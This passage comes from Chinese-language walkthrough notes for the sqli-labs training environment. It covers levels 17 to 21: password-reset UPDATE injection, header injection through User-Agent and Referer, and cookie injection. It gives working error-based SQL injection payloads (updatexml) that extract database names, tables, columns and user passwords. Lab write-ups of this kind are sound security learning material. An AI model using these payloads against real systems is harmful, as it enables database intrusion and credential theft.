![image-20210527170508219](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210527170508219.png)

要求重置密码，我们怎么根据重置密码来获取数据库中的值呢？

这里后台代码是先根据username的值来判断数据库中是否有输入的值，如果有的话，就会执行update语句，更新密码，这里的密码存在注入，由于它是update，所以就不能使用 union select，我们在这里可以使用报错注入

![image-20210527173059828](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210527173059828.png)

而且通过语法错误回显可以测试出这一关是单引号字符型注入。但是通过这一关卡的前提是必须知道一个用户名。

获得数据库payload：

~~~
passwd=admin%27+or+updatexml(1,concat(0x7e,(select+database()),0x7e),1)%23
~~~

![image-20210527173514622](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210527173514622.png)

获取表payload：**注意：这里的updatexml关键字前面是and,这是因为1和报错注入语句要都执行，如果是or，执行完更新密码为1之后，后面的updatexml语句就不会执行**

~~~
passwd=1'+and+updatexml(1,concat(0x7e,(select+table_name+from+information_schema.tables+where+table_schema="security"+limit+3,1),0x7e),1)%23
~~~

![image-20210527174337740](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210527174337740.png)

从users表中查询password信息，报错了

![image-20210527175607769](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210527175607769.png)

![img](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/1675852-20190526103007361-1980441638.png)

看来是更新信息的表和查信息的表不能同时使用，想办法绕过限制，在里面再嵌套一层select查询使用别名aa

payload：

~~~
passwd=111'+and+(updatexml(1,concat(0x7e,(select+password+from+(select+password+from+users+where+username="admin")aa),0x7e),1))%23
~~~

![image-20210527180352717](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210527180352717.png)

## 第十八关

![image-20210602192059992](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602192059992.png)

数据包请求头注入，抓包测试一下

这一关的代码：

![image-20210602193555386](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602193555386.png)

由于select语句做了很强的过滤，所以他并不存在注入，所以咱们只能从insert语句下手了。但是insert成功执行的前提就是需要成功输入正确的用户名和密码，才能执行到insert语句。

![image-20210602194023706](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602194023706.png)

接下来就是尝试在UA字段或者XXF字段注入SQL代码

![image-20210602194220760](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602194220760.png)

根据上述图片咱们发现XXF字段对ip并没有什么影响，所以尝试在ua字段中进行注入。在1后面加上单引号，报了语法错误，很明显此关卡是单引号字符注入。

![image-20210602194354165](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602194354165.png)

看到报错信息，猜想后台的insert语句应该是 ： `insert into table values('User-Agent','ip','username')`

接下来我们尝试在User-Agent的位置进行注入测试，我们修改User-Agent的值使其符合整个insert into的语法，闭合后就应该为 `insert into table values('1',1,1)#'ip','username')`,成功绕过

![image-20210602195344190](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602195344190.png)

现在利用报错注入语句来注入到insert语句中

爆破出当前数据库

payload：

~~~
1',1,updatexml(1,concat(0x7e,database(),0x7e),1))#
~~~

![image-20210602200726586](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602200726586.png)

获取当前数据库中的表名：

~~~
1',1,updatexml(1,concat(0x7e,(select group_concat(table_name)
~~~

![image-20210602201329697](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602201329697.png)

获取users表中的字段：

~~~
1',1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users" and table_schema="security"),0x7e),1))#
~~~

![image-20210602201505454](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602201505454.png)

获取security.users表中的数据：

~~~
1',1,updatexml(1,concat(0x7e,(select group_concat(concat(username,0x7e,password)) from security.users),0x7e),1))#
~~~

![image-20210602201926359](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602201926359.png)	

成功获得users表中的数据

## 第十九关

![image-20210602202311752](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602202311752.png)

![image-20210602202452936](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602202452936.png)

这个关卡跟上一个关卡一样，都需要输入正确的username和password，才能进行insert注入。本关卡是对Referer字段字段进行注入：

![image-20210602202656722](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602202656722.png)

输入单引号提示有语法错误，本关卡是单引号字符型注入。但是并没有回显insert注入的字段有几个，咱们只能猜测了。

一个注入字段报错

![image-20210602203036348](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602203036348.png)

两个注入字段成功

![image-20210602203119236](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602203119236.png)

下面使用报错注入开始获取数据库中的数据信息

获取当前数据库名称信息：

~~~
1',updatexml(1,concat(0x7e,(select database()),0x7e),1))#
~~~

![image-20210602203720724](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602203720724.png)

获取所有数据库名称信息：**用substring()函数获取了全部信息**

~~~
1',updatexml(1,concat(0x7e,(select substring(group_concat(schema_name),1) from information_schema.schemata ),0x7e),1))#
1',updatexml(1,concat(0x7e,(select substring(group_concat(schema_name),30) from information_schema.schemata ),0x7e),1))#
1',updatexml(1,concat(0x7e,(select substring(group_concat(schema_name),60) from information_schema.schemata ),0x7e),1))#
~~~

![image-20210602204133315](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602204133315.png)

![image-20210602204303568](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602204303568.png)

![image-20210602204406153](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602204406153.png)

获取security数据库中所有表的名称

~~~
1',updatexml(1,concat(0x7e,(select substring(group_concat(table_name),1) from information_schema.tables where table_schema="security"),0x7e),1))#
~~~

![image-20210602204525176](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602204525176.png)

获取security.users表中的字段信息：

~~~
1',updatexml(1,concat(0x7e,(select substring(group_concat(column_name),1) from information_schema.columns where table_schema="security" and table_name="users"),0x7e),1))#
~~~

![image-20210602204640784](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602204640784.png)

获取security.users表中的数据信息：

~~~
1',updatexml(1,concat(0x7e,(select substring(group_concat(concat(username,0x7e,password)),1) from security.users),0x7e),1))#
1',updatexml(1,concat(0x7e,(select substring(group_concat(concat(username,0x7e,password)),30) from security.users),0x7e),1))#
1',updatexml(1,concat(0x7e,(select substring(group_concat(concat(username,0x7e,password)),60) from security.users),0x7e),1))#
~~~

![image-20210602204815178](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602204815178.png)

![image-20210602204911776](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602204911776.png)

![image-20210602204926621](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210602204926621.png)

获取了全部的users表中的信息

## 第二十关

![image-20210604200830978](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604200830978.png)

在请求头字段加上cookie的uname字段，会回显一些数据信息，试试cookie是否存在注入漏洞。

经测试本关卡是字符型注入，union select

![image-20210604201125396](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604201125396.png)

获取所有数据库名称：

![image-20210604201254604](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604201254604.png)

获取security数据库中的所有表名：

![image-20210604201554304](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604201554304.png)

获取security.users表中的字段：

![image-20210604201728550](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604201728550.png)

获取security.users表中的所有数据

![image-20210604201855487](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604201855487.png)

## 第二十一关

下面是21关的源码

![image-20210604202656519](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604202656519.png)

他把cookie进行了base64解码，说明我们需要提前进行base64编码再修改cookie值，而且单引号加括号的注入方式

base64编码：

![image-20210604203133165](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604203133165.png)

会显得数据：

![image-20210604203201799](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604203201799.png)

接下来就是获取数据库的信息了，多一道步骤就是需要先base64编码，在传输到cooKie中

获取所有的数据库名称：

![image-20210604203410776](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604203410776.png)

![image-20210604203423534](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604203423534.png)

获取security数据中的所有表名称：

![image-20210604203549704](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604203549704.png)

![image-20210604203541713](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604203541713.png)

获取security.users表中的字段：

![image-20210604203653839](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604203653839.png)

![image-20210604203714873](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604203714873.png)

获取security.users表中的所有数据：

![image-20210604203813712](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604203813712.png)

![image-20210604203833871](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210604203833871.png)